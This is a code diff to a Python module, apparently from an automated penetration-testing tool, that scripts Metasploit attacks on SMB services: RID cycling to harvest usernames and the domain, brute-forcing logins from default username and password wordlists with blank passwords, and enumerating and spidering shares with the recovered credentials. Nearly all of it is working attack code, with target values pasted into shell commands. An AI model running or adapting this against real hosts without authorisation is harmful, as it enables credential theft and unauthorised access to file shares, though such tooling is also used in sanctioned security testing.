@@ -1,9 +1,12 @@
 import subprocess
 import re
 from mods.mod_utils import *
+import os
 
-smb_users = ["","guest","admin","user","manager","supervisor","administrator","test","it","backup","lab","demo","smb"]
-smb_passwords = ["","password","admin","administrator","backup","test","lab","demo"]
+smb_users = ["admin","user","manager","supervisor","administrator","test","it","backup","lab","demo","smb"]
+smb_passwords = ["password","admin","administrator","backup","test","lab","demo"]
+domain = '.'
+credentials = []
 
 
 def export_wordlists():
@@ -16,8 +19,14 @@ def export_wordlists():
         file.close()
 
 
-def rid_cycling(target, user, passw, domain):
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set rhosts {target};set MinRID 1000;set MaxRID 5000;set SMBUser {user};set SMBPass {passw};set THREADS 10;set SMBDomain {domain};run;exit;"'
+def export_credentials():
+    with open('smb_credentials.txt', 'w') as file:
+        file.write('\n'.join(credentials))
+        file.close()
+
+
+def rid_cycling(target, user="Guest", passw="", domain="."):
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set RHOSTS {target};set SMBUser {user};set SMBPass {passw};set MinRID 1000;set MaxRID 5000;set THREADS 10;set SMBDomain {domain};run;exit;"'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -25,19 +34,35 @@ def rid_cycling(target, user, passw, domain):
         return
 
     if output:
-        print_banner('445')
-        print('[!]', cmd)
-        print('[!] RID Cycling Attack to get Usernames')
-        print('')
-        print(output)
+        if ('USER' in output):
+            rid_cycling_parse(output, cmd)
 
 
-def handle_smb(target):
-    rid_cycling(target, 'Guest', '', '.')
+def rid_cycling_parse(output, cmd):
+    global domain
+    global smb_users
 
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set BLANK_PASSWORDS true;set ANONYMOUS_LOGIN true;set rhosts {target};set USER_AS_PASS true;set STOP_ON_SUCCESS true;set VERBOSE false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;run;exit;"'
+    print_banner('445')
+    print('[!]', cmd)
+    printc('[+] RID Cycling Attack to get Usernames', GREEN)
+    print('')
 
-    export_wordlists()
+    temp_users = []
+
+    for line in output.splitlines():
+        if ('DOMAIN' in line) and ('LOCAL' in line):
+            domain = re.findall('LOCAL.*DOMAIN\((.*) -', line)[0]
+            printc(f'[+] Domain: {domain}', BLUE)
+        if ('USER' in line):
+            user = re.findall('USER=(.*)\sRID', line)[0]
+            printc(f'[+] {user}', BLUE)
+            temp_users.append(user)
+    if len(temp_users) > 0:
+        smb_users = temp_users
+
+
+def bruteforce(target, port):
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -56,28 +81,39 @@ def handle_smb(target):
 
                 res = re.findall("Success: '(.*)'", line)
 
-                user = ''
-                passw = ''
 
-                if res:
-                    domain = res[0].split('\\')[0]
-                    creds = res[0].split('\\')[1]
-                    user = creds.split(':')[0]
-                    passw = creds.split(':')[1]
+def enumerate_shares(target, user, passw, domain):
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set rhosts {target};set LogSpider 0;set MaxDepth 0;set SMBPass {passw};set SMBUser {user};set ShowFiles true;set SpiderShares true;run;exit;"'
 
-                cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set rhosts {target};set LogSpider 0;set MaxDepth 0;set SMBPass {passw};set SMBUser {user};set ShowFiles true;set SpiderShares true;run;exit;"'
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+    except:
+        return
 
-                try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-                except:
-                    return
+    if output:
+        print_banner('445')
+        print('[!]', cmd)
+        print('[!] Enumerating Shares.')
+        print('')
+        print(output)
 
-                if output:
-                    print_banner('445')
-                    print('[!]', cmd)
-                    print('[!] Enumerating Shares.')
-                    print('')
-                    print(output)
+    rid_cycling(target, user, passw, domain)
 
-                rid_cycling(target, user, passw, domain)
-                break
+
+def handle_smb(target, port):
+    len_default_users = len(smb_users)
+
+    # TEST RID CYCLING NO PASS
+    rid_cycling(target, user='')
+
+    if len_default_users == len(smb_users):
+        rid_cycling(target)
+
+    export_wordlists()
+
+    bruteforce(target, port)
+
+    try:
+        os.remove('smb_pass.txt')
+    except Exception as e:
+        printc(f'[-] {e}', RED)
